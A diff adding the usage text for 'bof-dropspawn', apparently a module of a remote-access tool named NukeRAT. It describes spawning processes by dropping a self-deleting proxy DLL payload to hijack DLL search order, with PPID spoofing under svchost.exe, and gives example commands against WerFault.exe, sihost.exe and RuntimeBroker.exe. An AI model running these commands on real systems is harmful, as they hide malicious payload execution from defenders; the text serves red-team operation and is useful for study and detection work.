@@ -1,0 +1,27 @@
+ABOUT
+    Spawns a new process by dropping a proxy DLL to disk and spoofing the
+    application directory used for DLL search order. Supports x86, x64, and
+    cross architecture spawning. The dropped DLL should delete itself after
+    the new process loads it.
+USAGE:
+    bof-dropspawn --- <proxy DLL> <x86|x64> <program> [writable folder] [parent]
+
+ARGUMENTS:
+    proxy DLL         Full path to the proxy DLL payload downloaded from the target machine
+    x86|x64           Architecture of the process to spawn
+    program           Executable name or full path. For System32 executables, provide only the
+                      name. Append command line arguments after the executable name
+    writable folder   Optional writable folder to drop the DLL. Use . for current directory
+    parent            Optional parent process name for PPID spoofing
+
+EXAMPLES:
+    bof-dropspawn --- C:\payloads\dbgcore.dll x64 "WerFault.exe -u -p 4352 -s 160" C:\Users\user\AppData\Local\Temp
+    bof-dropspawn --- C:\payloads\coremessaging.dll x64 sihost.exe . svchost.exe
+    bof-dropspawn --- C:\payloads\umpdc.dll x64 "RuntimeBroker.exe -Embedding" C:\Users\user svchost.exe
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-dropspawn -w 60 --- C:\payloads\dbgcore.dll x64 "WerFault.exe -u -p 4352 -s 160" C:\Users\user\AppData\Local\Temp
